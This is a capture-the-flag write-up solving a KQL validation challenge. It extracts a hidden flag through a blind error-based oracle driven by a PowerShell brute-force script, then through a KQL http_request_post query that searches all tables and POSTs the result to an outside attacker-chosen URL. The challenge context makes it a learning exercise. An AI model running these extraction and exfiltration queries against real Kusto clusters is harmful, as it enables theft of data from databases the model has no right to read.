> :memo: **Note:** Category: misc

# Kusto Query Validation Service Writeup

A bit of a warning - this is a long read. Someone was out of brainpower and went down the famous 🐰-hole a few times.

> We have created a service that will validate the syntax of your KQL queries. There is a long flag in the Kusto database as well, so you can both get your flag and have fun with KQL!

Challenge link:
https://team-instance-kqlvalidation.ept.gg

![bilde](https://github.com/user-attachments/assets/06885db9-3558-4250-8cff-310316f4c7a7)

There is two parts to this challenge, the first is a list of cluster settings. This tells us what policies and settings are enabled on the cluster. **In hindsight, the inclusion of this was a pretty big hint**, but that's always 20/20 anyways. 
The second part is the KQL validation service, which allows us to test KQL queries against a database.

## KQL Validation Service

The validation service is located at the `/validate` endpoint. Testing the query validation service with a simple query:

```kql
StormEvents
| take 1
```
The response is: "KQL query is valid"

Knowing that the `StormEvents`-table exists, we can trigger one of the policy settings for the clusters by outputting more than 500 results (this will be important later).

The policy setting in question is: 
```json
"MaxResultRecords": {
    "IsRelaxable": false,
    "Value": 500
}
```

The query to trigger this policy is:

```kql
StormEvents
```

This outputs the following response:

> KQL query failed with error: Query execution has exceeded the allowed limits (80DA0003): The results of this query exceed the set limit of 500 records, so not all records were returned (E_QUERY_RESULT_SET_TOO_LARGE, 0x80DA0003). See https://aka.ms/kustoquerylimits for more information and possible solutions..

From this I assume that we are getting actual output here and it's not just running validation as a web application, it's actually submitting them to an ADX-cluster 🥳.

## Finding the flag

Now, my idea was very simple because I am after all a very simple 👨‍🦲. I know that if I return more than 500 results, the query will fail. So I created a dummy data set with 501 values using the following KQL code:

```kql
// Step 1: Define the dataset with 500 rows
let myData = range num from 1 to 501 step 1; // This will be a dataset of 500 entries
```

> :memo: **Note:** I later realized I could have just used the `StormEvents`-table to output more than 500 results. I was very focused on the number 500, which is why I decided to do that in order to make sure I was outputting exactly 500 results. At some point I went back and decided to make the dataset 501, so I could do `take 501` so yeah. Sometimes it's just hard to make 🧠 do 💡.

The query to check for the flag value is the following:

```kql
let searchResults = search * 
    | where * startswith 'EPT{'
    | where * endswith '}'
    | summarize SearchCount = count();
```

To briefly explain the query above, search allows me to search all tables in the database for a specific string. The same also works for the `where`-clause. Using `startswith` and `endswith` I can filter out the results that start with the string `EPT{` and ends with `}`. During testing I didn't have the `endswith` clause in the beginning and I got a lot of false positives that way. I also at some point used the `contains` clause, but that also gave me a lot of false positives.
My idea to output data was that if I got a result, I could use an `iff`-clause combined with a variable set to 500. Then I could query `myData` and use the `take`-clause with the variable to either output 500 or 501 results. This way, any time I got a hit I would return 501 results and trigger the policy setting.

```kql
let initialCount = 500;
let totalCount = initialCount + iff(toscalar(searchResults) > 0, 1, 0);
myData
| take totalCount
```

For some light education style 🧠 food, [`iff`](https://learn.microsoft.com/en-us/kusto/query/iff-function?view=microsoft-fabric) is actually pretty neat and very good to know. It takes three inputs in it's syntax `iff(if, then, else)` and it works like you would expect - if the `if` part is true it returns the `then` value, if not it returns `else`.
In our case, the `searchResults` should at this point contain the count `1` or more. So if the statement that `searchResults` > 0 is true, it returns 1. 

Put together, the full query looks like this:

```kql
let myData = range num from 1 to 501 step 1; // This will be a dataset of 500 entries
let searchResults = search * 
    | where * startswith '$prefix'
    | where * endswith '}'
    | summarize SearchCount = count();
let initialCount = 500;
let totalCount = initialCount + iff(toscalar(searchResults) > 0, 1, 0);
myData
| take totalCount
```

As we know, when the query gets a result we will end up doing `myData | take 501` which throws an error. At this point I'm not ashamed to say I was pretty proud of myself 🥇.

## Scripting the solution

I decided to script a wrapper in Powershell to automate the process of querying the KQL validation service. First I wrote a function to submit the KQL query to the service:

```powershell
# Define the endpoint URL
$endpointUrl = "https://hashgoblins-316b-kqlvalidation.ept.gg/validate_kql"
function SubmitKql {
    param (
        [string]$query
    )
    $formData = @{
        query = $query
    }
    # Convert form data to JSON format
    $jsonBody = $formData | ConvertTo-Json
    try {
        # Make the POST request
        $response = Invoke-RestMethod -Uri $endpointUrl -Method Post -ContentType "application/json" -Body $jsonBody
        return $response
    } catch {
        return $_
    }
}
```

In order to output the data I needed, I had to return the the error message and not throw an exception, which is why I used a `try-catch`-block with a `return $_` in the catch-block.

For the script itself, it's similar to the other KQL task, basically just takes a list of characters in the `$characters`-variable and loops through them. I provide a variable for the starting prefix `$currentPrefix` set to `EPT{`. 

```powershell
# Define the characters to iterate through
$characters = @('A'..'Z') + @('0'..'9') + @('_', '{', '}', '.', '-', '<', '>', '*', ':', '+', "=", '$')

# Initialize variables
$currentPrefix = "EPT{"
$runCount = 0

# Loop to find the flag
while ($true) {
    $found = $false
    foreach ($char in $characters) {
        $prefix = $currentPrefix + $char
        Write-Output "Running query with prefix: $prefix"
        $query = @"
let myData = range num from 1 to 501 step 1; // This will be a dataset of 500 entries
let searchResults = search * 
    | where * startswith '$prefix'
    | where * endswith '}'
    | summarize SearchCount = count();
let initialCount = 500;
let totalCount = initialCount + iff(toscalar(searchResults) > 0, 1, 0);
myData
| take totalCount
"@
        $response = SubmitKql -query $query
        # Check if the query is valid
        if ($response.message -eq "KQL query is valid")  {
                # If the query is valid, skip to next
                continue
        } else {
            Write-Output "Found valid table name character: $currentPrefix"
            $found = $true
            $currentPrefix += $char
            $runCount++
        } 
    }
    # If we didn't find a valid character, we break the loop (usually means we're on the end of our path)
    if (-not $found) {
        Write-Output "No more matches found. Current flag": $currentPrefix"
        break
    }
    $runCount++
}
Write-Output "Completed search."
```

Output looks like this:

```plaintext
Running query with prefix: EPT{6X+JD$>THIS_IS_A_V3RY_LONG_FL4G_D0NT_TRY_TF<
Running query with prefix: EPT{6X+JD$>THIS_IS_A_V3RY_LONG_FL4G_D0NT_TRY_TF>
Running query with prefix: EPT{6X+JD$>THIS_IS_A_V3RY_LONG_FL4G_D0NT_TRY_TF*
Running query with prefix: EPT{6X+JD$>THIS_IS_A_V3RY_LONG_FL4G_D0NT_TRY_TF:
Running query with prefix: EPT{6X+JD$>THIS_IS_A_V3RY_LONG_FL4G_D0NT_TRY_TF+
Running query with prefix: EPT{6X+JD$>THIS_IS_A_V3RY_LONG_FL4G_D0NT_TRY_TF=
Running query with prefix: EPT{6X+JD$>THIS_IS_A_V3RY_LONG_FL4G_D0NT_TRY_TF$
No more matches found. Current prefix: EPT{6X+JD$>THIS_IS_A_V3RY_LONG_FL4G_D0NT_TRY_TF
```

... there is a valid value `EPT{6X+JD$>THIS_IS_A_V3RY_LONG_FL4G_D0NT_TRY_TF` in the database. At this point I'm just in too fucking deep to quit, the monkey 🧠 train continues 🚅! I just assume there's also one that's either `_TO` or `_T0` instead of `_TF`, so I just manually change the prefix and run the script again. 

```plaintext
Found valid table name character: EPT{6X+JD$>THIS_IS_A_V3RY_LONG_FL4G_D0NT_TRY_TO_BR
Running query with prefix: EPT{6X+JD$>THIS_IS_A_V3RY_LONG_FL4G_D0NT_TRY_TO_BRUV
Running query with prefix: EPT{6X+JD$>THIS_IS_A_V3RY_LONG_FL4G_D0NT_TRY_TO_BRUW
Running query with prefix: EPT{6X+JD$>THIS_IS_A_V3RY_LONG_FL4G_D0NT_TRY_TO_BRUX
Running query with prefix: EPT{6X+JD$>THIS_IS_A_V3RY_LONG_FL4G_D0NT_TRY_TO_BRUY
Running query with prefix: EPT{6X+JD$>THIS_IS_A_V3RY_LONG_FL4G_D0NT_TRY_TO_BRUZ
```

I see where this is going. This is a very slow method (partly the reason why we weren't able to finish the challenge during the competition), but it works. The script will output the flag in the end, but we might get other false positives and hurdles along the way. So there has to be a better way to do this.

> :memo: **Note:** During the CTF I never pivoted and kept bonking away at this like a madman. There was a lot of characters that just escaped my script and threw errors into my loop that I had to manually fix. Just goes to show that even when someone tries very hard to tell me "this isn't the correct way sir" I'll just be stubborn like a 🐴 (the donkey emoji didn't work).

## http_request_post

After some discussion after the competition, I was made aware of the fact that the setting `http_request_post` was enabled on the cluster:

```json
{
    "Description": "Version=2",
    "IsEnabled": true,
    "PluginName": "http_request_post"
}
```

If we read about the [http_request_post](https://learn.microsoft.com/en-us/kusto/query/http-request-post-plugin?view=microsoft-fabric) plugin we can see that it allows us to make HTTP POST requests. I think (might be wrong on this) it limits us to the URLs defined in the callout policy. As you've probably learned at this point, I'm not very smart, so it might be an idea to not listen to me.

> Set the URI to access as an allowed destination for webapi in the Callout policy

The relevant parts of the policy settings are:

```json
Command Executed:

.show cluster policy callout

Result:

[
  {
    "ChildEntities": [
      "$systemdb",
      "KustoMonitoringPersistentDatabase",
      "main"
    ],
    "EntityName": "",
    "EntityType": "Cluster immutable policy",
    "Policy": [
      {
        "CalloutType": "external_data",
        "CalloutUriRegex": ".*",
        "CanCall": true
      },
    ],
    "PolicyName": "CalloutPolicy"
  },
  {
    "ChildEntities": [
      "$systemdb",
      "KustoMonitoringPersistentDatabase",
      "main"
    ],
    "EntityName": "",
    "EntityType": "Cluster",
    "Policy": [
      {
        "CalloutType": "webapi",
        "CalloutUriRegex": ".*",
        "CanCall": true
      }
    ],
    "PolicyName": "CalloutPolicy"
  }
]
```

We can also view an example of how to use the `http_request_post` plugin:


|Name |	Type| 	Required |	Description|
|--|--|--|--|
|Uri |	string |	✔️ |	The destination URI for the HTTP or HTTPS request.|
|RequestHeaders 	|dynamic ||		A property bag containing HTTP headers to send with the request.|
|Options |	dynamic 	||	A property bag containing additional properties of the request.|
|Content |	string 	|	|The body content to send with the request. The content is encoded in UTF-8 and the media type for the Content-Type attribute is application/json.|

Based on this, we can craft a query to make a POST request to a URL of our choosing, where we can accept the flag as a POST request. We can store the flag in a variable and send it to the URL of our choosing. 

```kql
// search for the flag and store it in the searchResults variable
let searchResults = toscalar(search * | where * startswith 'EPT{' | where * endswith '}' | project flag = dynamic_to_json(pack_all()));
// send the searchResults variable to the URL of our choosing
let uri = 'http://mysupersecret.website/endpoint';
let headers = dynamic({});
let options = dynamic({});
evaluate http_request_post(uri, headers, options , searchResults)
```

The idea with this query is pretty simple, it's the same as we used before with `search` and `where`, but in order to send data via the `http_request_post` plugin we have to store the data in a variable. `http_request_post` also expects the content in the form of a string, so we use `project` the result into a single column we call flag, then we convert all columns into a json object using `pack_all()` before converting the result into a json string using `dynamic_to_json()`. We then use `toscalar` to convert the results into a scalar value, which we store in the `searchResults` variable.

As we know, the `http_request_post` takes four arguments, the URI, headers, options and content. Both `URI` and `content` is set at this point, and we can set the headers and options to empty objects as long as they are dynamic.

So, at this point I decided to commit to the bit of doing things like a caveman and decided, instead of spinning up a webserver to recieve the flag, I'll create a logic app in Azure instead. 

The config for the logic app is quite simple:

```json
{
    "definition": {
        "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
        "contentVersion": "1.0.0.0",
        "triggers": {
            "When_a_HTTP_request_is_received": {
                "type": "Request",
                "kind": "Http"
            }
        },
        "actions": {},
        "outputs": {},
        "parameters": {
            "$connections": {
                "type": "Object",
                "defaultValue": {}
            }
        }
    },
    "parameters": {
        "$connections": {
            "value": {}
        }
    }
}
```

When you save it, you'll get a webhook endpoint that you can use to send the flag to. 

![bilde](https://github.com/user-attachments/assets/5332e500-56e5-4561-af81-1b332dc5eed4)

What is this, low code CTF? Anyway, the flag is:

```
EPT{6X+Jd$>this_is_A_v3ry_long_fl4g_d0nt_try_to_brute_force_itt=B+----J-P.=pEv'GvAJ$aFdyRia.<i<N/7-Ymes3dU2Kjl'MrYM7-FHNDFf'UNZ'hq1n1Mveb'RCyEX'MlJ2kK,b,:Zn'>ABjwgv_7'j7''FY*I'JI,z@K1dvPLE@>R9!6x3O4hYG_5!/HnD/gt_g::S9'IgD'5@vbBfAcUOrv'u<4O=$,'IE./=DY$RX}
```

## Some notes for improvement

- I still want to make a multi-threaded version of this. I attempted during the CTF but my code was like that of a child or toddler.
- `http_request_post` is pretty cool. 
